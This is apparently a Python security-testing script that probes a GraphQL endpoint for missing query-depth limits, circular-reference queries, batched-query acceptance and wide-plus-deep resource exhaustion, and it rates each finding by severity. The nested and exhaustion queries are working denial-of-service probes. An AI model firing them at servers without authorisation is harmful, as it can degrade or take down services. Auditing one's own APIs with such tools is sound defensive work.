#!/usr/bin/env python3
"""Agent for performing GraphQL depth limit attack testing."""

import json
import argparse
import time
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None


def build_nested_query(field_name, depth, leaf="__typename"):
    """Build a deeply nested GraphQL query string."""
    query = leaf
    for _ in range(depth):
        query = f"{field_name} {{ {query} }}"
    return "query { " + query + " }"


def test_depth_limit(url, max_depth=20, headers=None):
    """Probe GraphQL endpoint for query depth enforcement."""
    hdrs = {"Content-Type": "application/json"}
    if headers:
        hdrs.update(headers)
    results = []
    last_success = 0
    for depth in range(1, max_depth + 1):
        query = build_nested_query("__schema", depth, "__typename")
        try:
            resp = requests.post(url, json={"query": query}, headers=hdrs, timeout=15)
            data = resp.json()
            has_errors = "errors" in data
            has_data = bool(data.get("data"))
            blocked = has_errors and not has_data
            results.append({"depth": depth, "status": resp.status_code, "blocked": blocked, "response_time_ms": resp.elapsed.total_seconds() * 1000})
            if not blocked:
                last_success = depth
            if blocked:
                break
        except Exception as e:
            results.append({"depth": depth, "error": str(e)})
            break
    finding = "NO_DEPTH_LIMIT" if last_success >= max_depth else f"DEPTH_LIMIT_AT_{last_success + 1}"
    severity = "HIGH" if last_success >= 15 else "MEDIUM" if last_success >= 8 else "LOW"
    return {
        "url": url, "max_depth_tested": max_depth, "max_allowed_depth": last_success,
        "finding": finding, "severity": severity, "details": results,
        "timestamp": datetime.utcnow().isoformat(),
    }


def test_circular_query(url, type_a, field_a, type_b, field_b, depth=10, headers=None):
    """Test circular reference queries (e.g., user.posts.author.posts...)."""
    hdrs = {"Content-Type": "application/json"}
    if headers:
        hdrs.update(headers)
    fragment = ""
    for i in range(depth):
        if i % 2 == 0:
            fragment = f"{field_a} {{ {fragment} }}" if fragment else f"{field_a} {{ __typename }}"
        else:
            fragment = f"{field_b} {{ {fragment} }}"
    query = f"query {{ {fragment} }}"
    try:
        resp = requests.post(url, json={"query": query}, headers=hdrs, timeout=30)
        data = resp.json()
        return {
            "url": url, "circular_depth": depth,
            "type_pair": f"{type_a}.{field_a} <-> {type_b}.{field_b}",
            "status": resp.status_code,
            "blocked": "errors" in data and not data.get("data"),
            "response_time_ms": resp.elapsed.total_seconds() * 1000,
        }
    except Exception as e:
        return {"error": str(e)}


def test_batch_query(url, count=50, headers=None):
    """Test if batched queries bypass depth limits."""
    hdrs = {"Content-Type": "application/json"}
    if headers:
        hdrs.update(headers)
    queries = [{"query": "{ __typename }"} for _ in range(count)]
    try:
        resp = requests.post(url, json=queries, headers=hdrs, timeout=30)
        data = resp.json()
        accepted = isinstance(data, list)
        return {
            "url": url, "batch_size": count, "batch_accepted": accepted,
            "responses": len(data) if accepted else 0,
            "finding": f"BATCH_ALLOWED_{count}" if accepted else "BATCH_REJECTED",
            "severity": "HIGH" if accepted and count >= 20 else "MEDIUM" if accepted else "INFO",
        }
    except Exception as e:
        return {"error": str(e)}


def test_resource_exhaustion(url, width=50, depth=5, headers=None):
    """Test wide + deep queries for resource exhaustion potential."""
    hdrs = {"Content-Type": "application/json"}
    if headers:
        hdrs.update(headers)
    fields = " ".join([f"f{i}: __typename" for i in range(width)])
    nested = fields
    for _ in range(depth):
        nested = f"__schema {{ types {{ {nested} }} }}"
    query = f"query {{ {nested} }}"
    try:
        start = time.time()
        resp = requests.post(url, json={"query": query}, headers=hdrs, timeout=30)
        elapsed = (time.time() - start) * 1000
        return {
            "url": url, "width": width, "depth": depth,
            "total_fields": width * depth, "status": resp.status_code,
            "response_time_ms": round(elapsed, 1),
            "finding": "SLOW_RESPONSE" if elapsed > 5000 else "NORMAL",
        }
    except Exception as e:
        return {"error": str(e)}


def main():
    if not requests:
        print(json.dumps({"error": "requests not installed — pip install requests"}))
        return
    parser = argparse.ArgumentParser(description="GraphQL Depth Limit Attack Agent")
    sub = parser.add_subparsers(dest="command")
    d = sub.add_parser("depth", help="Test query depth limits")
    d.add_argument("--url", required=True)
    d.add_argument("--max-depth", type=int, default=20)
    d.add_argument("--auth-header", help="Authorization header value")
    c = sub.add_parser("circular", help="Test circular reference queries")
    c.add_argument("--url", required=True)
    c.add_argument("--type-a", required=True)
    c.add_argument("--field-a", required=True)
    c.add_argument("--type-b", required=True)
    c.add_argument("--field-b", required=True)
    c.add_argument("--depth", type=int, default=10)
    b = sub.add_parser("batch", help="Test batch query acceptance")
    b.add_argument("--url", required=True)
    b.add_argument("--count", type=int, default=50)
    w = sub.add_parser("width", help="Test wide+deep resource exhaustion")
    w.add_argument("--url", required=True)
    w.add_argument("--width", type=int, default=50)
    w.add_argument("--depth", type=int, default=5)
    args = parser.parse_args()
    headers = {}
    if hasattr(args, "auth_header") and args.auth_header:
        headers["Authorization"] = args.auth_header
    if args.command == "depth":
        result = test_depth_limit(args.url, args.max_depth, headers or None)
    elif args.command == "circular":
        result = test_circular_query(args.url, args.type_a, args.field_a, args.type_b, args.field_b, args.depth, headers or None)
    elif args.command == "batch":
        result = test_batch_query(args.url, args.count, headers or None)
    elif args.command == "width":
        result = test_resource_exhaustion(args.url, args.width, args.depth, headers or None)
    else:
        parser.print_help()
        return
    print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()
